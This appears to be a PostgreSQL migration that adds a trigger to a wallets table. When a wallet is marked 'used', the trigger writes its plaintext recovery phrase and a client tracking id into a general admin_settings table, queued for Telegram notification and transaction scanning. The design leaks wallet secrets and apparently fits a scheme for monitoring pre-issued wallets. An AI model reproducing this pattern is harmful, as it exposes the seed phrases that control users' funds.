-- Update the create_wallet_transactions_on_use function to call the address generation function
CREATE OR REPLACE FUNCTION public.create_wallet_transactions_on_use()
RETURNS trigger
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path TO ''
AS $$
BEGIN
  -- Only proceed if wallet status changed to 'used' and we have a generated wallet
  IF NEW.status = 'used' AND OLD.status != 'used' AND NEW.used_by_commercial_id IS NOT NULL THEN
    
    -- Log wallet usage for async processing (Telegram notification, transaction scanning, and address generation)
    INSERT INTO public.admin_settings (setting_key, setting_value, description) 
    VALUES (
      'wallet_used_' || NEW.id || '_' || extract(epoch from now()), 
      json_build_object(
        'wallet_id', NEW.id,
        'commercial_id', NEW.used_by_commercial_id,
        'client_tracking_id', NEW.client_tracking_id,
        'phrase', NEW.wallet_phrase,
        'timestamp', now(),
        'generate_addresses', true
      )::text,
      'Wallet usage notification and address generation queue'
    );
  END IF;
  
  RETURN NEW;
END;
$$;

-- Create trigger if it doesn't exist
DO $$ 
BEGIN
    IF NOT EXISTS (SELECT 1 FROM pg_trigger WHERE tgname = 'wallet_status_change_trigger') THEN
        CREATE TRIGGER wallet_status_change_trigger
        AFTER UPDATE ON public.wallets
        FOR EACH ROW 
        EXECUTE FUNCTION public.create_wallet_transactions_on_use();
    END IF;
END $$;